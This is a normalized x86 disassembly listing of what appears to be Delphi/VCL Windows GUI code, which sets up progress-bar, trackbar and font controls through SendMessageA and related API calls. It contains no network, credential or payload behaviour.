mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051bc
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419080
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
mov ecx [ ebp - 0x4 ]
pop edx
call sub_429724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4356c3
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_434504
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_4356ec
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434504
pop edx
call sub_4355c0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40348c
pop esi
pop ecx
pop ebp
retn
sub_435768
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_4357b0
add esp 0xfffffff0
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x8 ] 0xffff
mov [ esp + 0xc ] 0x0
push esp
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
add esp 0x10
retn
sub_4357e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x20
call sub_434154
mov [ edi + 0x208 ] al
mov ecx esi
xor edx edx
mov eax edi
call sub_44b008
mov edx 0x96
mov eax edi
call sub_4482b0
push 0x14
call GetSystemMetrics
mov edx eax
mov eax edi
call sub_4482d4
xor eax eax
mov [ edi + 0x20c ] eax
mov [ edi + 0x210 ] 0x64
mov [ edi + 0x218 ] 0xa
mov [ edi + 0x21c ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_435874
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c168
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c094
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
call InitCommonControls
cmp [ ebx + 0x21d ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x1
sub_4358ce
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44c294
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x20c ]
call sub_406ae8
push eax
push 0x0
push 0x401
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov eax [ ebx + 0x210 ]
push eax
mov eax [ ebx + 0x20c ]
push eax
push 0x406
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov edx [ ebx + 0x214 ]
mov eax ebx
call sub_435b94
pop ebx
retn
sub_435974
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x20c ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x407
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_4359ac
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x407
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_4359e4
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x214 ]
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x403
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x408
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
pop ebx
retn
sub_435a34
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10c ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435b67
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4031e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
cmp esi [ ebx + 0x20c ]
jne r-xdata
test esi esi
jl r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
cmp edi [ ebx + 0x210 ]
je r-xdata
call sub_4357b0
cmp esi 0xffff
jg r-xdata
mov [ ebx + 0x20c ] esi
mov [ ebx + 0x210 ] edi
cmp [ ebx + 0x208 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b6e
lea eax [ ebp - 0x10c ]
call sub_404008
retn
test edi edi
jl r-xdata
mov edx edi
mov eax esi
call sub_406ae8
push eax
push 0x0
push 0x401
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
push edi
push esi
push 0x406
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
cmp edi 0xffff
jle r-xdata
push 0x0
push esi
push 0x402
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
cmp esi [ ebx + 0x20c ]
jge r-xdata
sub_435b94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
test esi esi
jl r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
push 0x0
push esi
push 0x402
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop esi
pop ebx
retn
call sub_4357b0
cmp esi 0xffff
jle r-xdata
sub_435be0
push ebx
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
sub_435c6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebx + 0x38 ] 0x28
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x24 ] 0xff00000f
mov [ ebx + 0x18 ] 0x1
mov [ ebx + 0x14 ] 0xffffffff
mov [ ebx + 0x1c ] 0x19
mov [ ebx + 0x2c ] 0x1
mov [ ebx + 0x2d ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov esi eax
mov [ ebx + 0x30 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_435f24
mov [ ebx + 0xf ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebx + 0x3c ] eax
mov ecx edi
xor edx edx
mov eax ebx
call sub_418c64
mov eax ebx
mov si 0xfffd
call sub_40348c
mov eax ebx
mov si 0xfffc
call sub_40348c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_435d20
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov edi eax
mov eax [ edi + 0x3c ]
call sub_403290
mov eax [ edi + 0x30 ]
call sub_403290
mov esi [ edi + 0x28 ]
xor eax eax
mov [ edi + 0x28 ] eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_418c9c
test esi esi
je r-xdata
test bl bl
jle r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax esi
call sub_448d54
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax esi
call sub_449ca8
sub_435d8c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_435ef4
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_420c1c
mov edx [ r-xdata ]
call sub_403440
pop ebx
pop ebp
retn
sub_435dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41890c
mov esi ebx
mov edx [ esi + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_435f68
mov dl [ esi + 0xd ]
mov eax [ ebp - 0x4 ]
call sub_435f94
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_436044
mov dl [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_436034
mov dl [ esi + 0xe ]
mov eax [ ebp - 0x4 ]
call sub_435fa4
mov dl [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_436000
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436024
mov edx [ esi + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_435fcc
mov edx [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_435fdc
mov dl [ esi + 0x2d ]
mov eax [ ebp - 0x4 ]
call sub_436104
mov dl [ esi + 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4360ec
mov edx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_4360bc
mov eax esi
call sub_435ecc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_435ff0
mov edx [ esi + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43611c
push ebp
mov eax [ esi + 0x28 ]
call sub_435d8c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_436058
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435ea8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x34 ]
call sub_40405c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418d08
sub_435ecc
push ebx
mov ebx eax
cmp [ ebx + 0xf ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_435ef4
cmp [ eax + 0x235 ] 0x0
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_435f24
push ebx
mov ebx eax
cmp [ ebx + 0x2d ] 0x0
jne r-xdata
xor edx edx
mov eax [ ebx + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0x30 ]
mov eax [ ebx + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x3c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
xor edx edx
mov eax ebx
call sub_418ccc
pop ebx
retn
mov dl 0x1
mov eax [ ebx + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
jmp r-xdata
sub_435fa4
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
mov [ eax + 0xe ] 0x0
xor edx edx
call sub_418ccc
mov [ eax + 0xd ] 0x0
mov [ eax + 0xe ] 0x1
mov dl 0x1
call sub_418ccc
jmp r-xdata
sub_436058
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x28 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x28 ]
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_43617c
test eax eax
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418ccc
test edi edi
je r-xdata
mov eax ebx
call sub_435ef4
mov edx eax
mov eax esi
call sub_4207e4
cmp ebx eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax edi
call sub_449ca8
xor edx edx
call sub_436058
sub_4360bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40405c
mov dl 0x1
mov eax ebx
call sub_418ccc
sub_43612c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_418e48
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43617c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
call sub_419088
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_4361c8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_4372e4
pop esi
pop ebx
retn
mov eax esi
call sub_418cf0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4372a0
pop esi
pop ebx
retn
sub_43620c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x400
call sub_434180
mov ecx esi
xor edx edx
mov eax edi
call sub_42c114
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov edx 0x96
mov eax edi
call sub_4482b0
mov edx 0x4b
mov eax edi
call sub_4482d4
mov dl 0x1
mov eax edi
call sub_436994
mov dl 0x1
mov eax edi
call sub_448cb8
mov dl 0x1
mov eax edi
call sub_448c20
mov [ edi + 0x214 ] 0x1
mov [ edi + 0x215 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov esi eax
mov [ edi + 0x218 ] esi
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] sub_436be0
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov [ edi + 0x21c ] eax
mov [ edi + 0x234 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ edi + 0x224 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43612c
mov [ edi + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ edi + 0x230 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_436a34
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43631c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x210 ]
call sub_403290
mov eax [ esi + 0x230 ]
call sub_403290
mov eax [ esi + 0x224 ]
call sub_403290
mov eax [ esi + 0x21c ]
call sub_403290
mov eax [ esi + 0x218 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_436378
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c168
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c094
mov eax [ esi + 0x4 ]
or eax 0x4e
xor edx edx
mov dl [ ebx + 0x214 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x229 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x228 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x235 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
mov eax [ esi + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x8000
sub_4363f9
add [ eax ] al
add [ edx + 0x65 ] dl
inc edx
popad
jb r-xdata
pop ebx
retn
imul ebp [ esi + 0x64 ] 0x3233776f
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x5e7ee8c3 ]
add [ eax ] eax
mov eax ebx
call sub_4366d8
mov edx eax
mov eax [ ebx + 0x21c ]
call sub_4239a4
mov eax ebx
call sub_436728
mov [ ebx + 0x220 ] eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4372e4
sub_43645c
push ebp
mov ebp esp
add esp 0xffffffb0
call sub_4361f4
mov edx eax
lea eax [ ebp - 0x50 ]
xor ecx ecx
call sub_402ca4
call sub_4361f4
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] 0x10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44f5e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x40 ]
and ecx 0x7fffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx 0x405
call sub_449ca8
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44f2dc
cmp eax [ ebp - 0x30 ]
je r-xdata
mov al 0x1
sub_4364d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov dl [ eax + 0x57 ]
mov eax [ ebp - 0x4 ]
call sub_435ff0
mov eax [ ebp - 0x8 ]
call sub_436c68
xor edi edi
push ebp
push sub_4365d1
push [ fs : edi ]
mov [ fs : edi ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4367b8
mov ecx eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ edx + 0x48 ]
mov edx [ edx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ edx + 0x4c ]
mov edx [ edx + 0x48 ]
jmp r-xdata
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x1c ]
jne r-xdata
lea ebx [ ecx + eax + 0x4 ]
mov esi edx
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x38 ]
jne r-xdata
sub ebx 0x4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
push ebp
call sub_43645c
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_436c70
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43611c
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_435fcc
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x0
sub_436600
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_419080
test eax eax
jg r-xdata
mov eax ebx
call sub_437060
test esi esi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_43617c
mov edx eax
mov eax ebx
call sub_4364d8
mov eax [ ebx + 0x210 ]
call sub_419080
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4361b0
mov edx eax
mov eax ebx
call sub_4364d8
inc edi
dec esi
jne r-xdata
jmp r-xdata
sub_436690
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x242 ] 0x0
je r-xdata
mov eax ebx
call sub_45f870
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4366d8
add esp 0xfffffeac
mov [ esp ] 0x154
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
jne r-xdata
mov [ esp + 0x28 ] 0x190
lea eax [ esp + 0x18 ]
push eax
call CreateFontIndirectA
add esp 0x154
retn
lea eax [ esp + 0x18 ]
push eax
push 0x3c
push 0xd
call GetStockObject
push eax
call GetObjectA
sub_436728
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4367a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4476d0
mov edx [ ebx + 0x21c ]
mov eax [ ebp - 0x8 ]
call sub_4247d4
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4248b4
push eax
call GetTextMetricsA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] eax
sub_4367b8
push ebp
mov ebp esp
add esp 0xffffffe8
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436985
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x11 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43698c
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_435ecc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x234 ]
or dl al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
jl r-xdata
test al al
je r-xdata
mov al 0x1
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x34 ]
call sub_4040a0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
add [ ebp - 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
test eax eax
je r-xdata
add [ ebp - 0xc ] 0x2
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x40 ] 0x7fffffff
jle r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x11 ] 0x1
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x235 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4368d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
call sub_4476d0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x18 ]
call sub_4247d4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
call sub_424714
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
add [ ebp - 0xc ] 0x4
call sub_4341a8
cmp eax 0x40047
jge r-xdata
add [ ebp - 0xc ] 0x4
mov eax [ eax + 0x34 ]
add [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ eax + 0x30 ]
add [ ebp - 0xc ] eax
jmp r-xdata
add [ ebp - 0xc ] 0x5
add [ ebp - 0xc ] 0x8
jmp r-xdata
sub_436994
push ebx
push ecx
mov ebx eax
mov al [ ebx + 0x5b ]
mov [ esp ] al
mov eax ebx
call sub_448008
mov al [ ebx + 0x5b ]
test [ ebx + 0x1c ] 0x2
jne r-xdata
pop edx
pop ebx
retn
cmp al [ esp ]
je r-xdata
dec eax
sub al 0x2
jb r-xdata
xor edx edx
mov eax ebx
call sub_436cec
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax ebx
call sub_436cec
jmp r-xdata
sub_436a34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x22c ]
jne r-xdata
mov eax [ ebx + 0x22c ]
call sub_455bf0
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_436a80
mov eax [ ebx + 0x22c ]
call sub_455d2c
mov edx eax
mov eax ebx
call sub_436a80
jmp r-xdata
sub_436a80
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
test esi esi
jne r-xdata
mov [ esp ] 0xc
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x8 ] esi
mov eax esp
push eax
xor ecx ecx
mov edx 0x404
mov eax ebx
call sub_449ca8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44c87c
jmp r-xdata
